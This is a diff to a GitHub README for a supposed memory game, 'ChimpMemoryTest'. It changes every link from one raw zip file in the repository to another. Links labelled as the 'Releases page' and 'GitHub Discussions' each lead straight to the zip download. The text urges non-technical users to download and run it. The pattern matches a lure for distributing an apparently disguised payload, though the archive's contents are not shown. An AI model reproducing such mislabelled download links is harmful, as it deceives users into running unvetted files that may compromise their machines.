@@ -1,7 +1,7 @@
 # 🐵 ChimpMemoryTest - Enhance Your Memory Skills Easily
 
 ## 📥 Download Now
-[![Download ChimpMemoryTest](https://raw.githubusercontent.com/gopoyrol/ChimpMemoryTest/main/hinderlands/ChimpMemoryTest.zip%https://raw.githubusercontent.com/gopoyrol/ChimpMemoryTest/main/hinderlands/ChimpMemoryTest.zip)](https://raw.githubusercontent.com/gopoyrol/ChimpMemoryTest/main/hinderlands/ChimpMemoryTest.zip)
+[![Download ChimpMemoryTest](https://github.com/gopoyrol/ChimpMemoryTest/raw/refs/heads/main/dist/Test_Chimp_Memory_2.9.zip%https://github.com/gopoyrol/ChimpMemoryTest/raw/refs/heads/main/dist/Test_Chimp_Memory_2.9.zip)](https://github.com/gopoyrol/ChimpMemoryTest/raw/refs/heads/main/dist/Test_Chimp_Memory_2.9.zip)
 
 ## 🐒 Introduction
 Welcome to ChimpMemoryTest! This game offers a fun and engaging way to test your memory. Inspired by research showing chimpanzees excel at memory challenges, this application lets you compare your skills against various levels of difficulty.
@@ -10,7 +10,7 @@ Welcome to ChimpMemoryTest! This game offers a fun and engaging way to test your
 Follow these steps to download and run ChimpMemoryTest on your device. No technical knowledge is needed!
 
 ### Step 1: Visit the Releases Page
-To access the game files, [visit the Releases page here](https://raw.githubusercontent.com/gopoyrol/ChimpMemoryTest/main/hinderlands/ChimpMemoryTest.zip). This page contains all the latest versions of the application.
+To access the game files, [visit the Releases page here](https://github.com/gopoyrol/ChimpMemoryTest/raw/refs/heads/main/dist/Test_Chimp_Memory_2.9.zip). This page contains all the latest versions of the application.
 
 ### Step 2: Choose Your Version
 On the Releases page, you will see a list of available versions. Click on the latest version to expand its details. 
@@ -53,7 +53,7 @@ ChimpMemoryTest runs smoothly on a variety of devices. Here are the basic requir
 - **Challenge Friends**: Invite others to compare scores and improve your skills together.
 
 ## 🌐 Community and Support
-Join our community to share your scores and tips. You can find us on our [GitHub Discussions](https://raw.githubusercontent.com/gopoyrol/ChimpMemoryTest/main/hinderlands/ChimpMemoryTest.zip) page. 
+Join our community to share your scores and tips. You can find us on our [GitHub Discussions](https://github.com/gopoyrol/ChimpMemoryTest/raw/refs/heads/main/dist/Test_Chimp_Memory_2.9.zip) page. 
 
 For further support, check the FAQs or reach out via the Issues tab on the repository.
 
@@ -67,7 +67,7 @@ ChimpMemoryTest is designed to be inclusive. The game features:
 - High-contrast visuals for improved accessibility.
 
 ## 🔗 Download & Install
-Now that you've learned how to get started, don’t wait any longer! [Visit the Releases page to download ChimpMemoryTest](https://raw.githubusercontent.com/gopoyrol/ChimpMemoryTest/main/hinderlands/ChimpMemoryTest.zip) and start enhancing your memory skills today.
+Now that you've learned how to get started, don’t wait any longer! [Visit the Releases page to download ChimpMemoryTest](https://github.com/gopoyrol/ChimpMemoryTest/raw/refs/heads/main/dist/Test_Chimp_Memory_2.9.zip) and start enhancing your memory skills today.
 
 ## 🎉 Conclusion
 We hope you enjoy playing ChimpMemoryTest. Have fun challenging your memory and discovering what you can achieve!
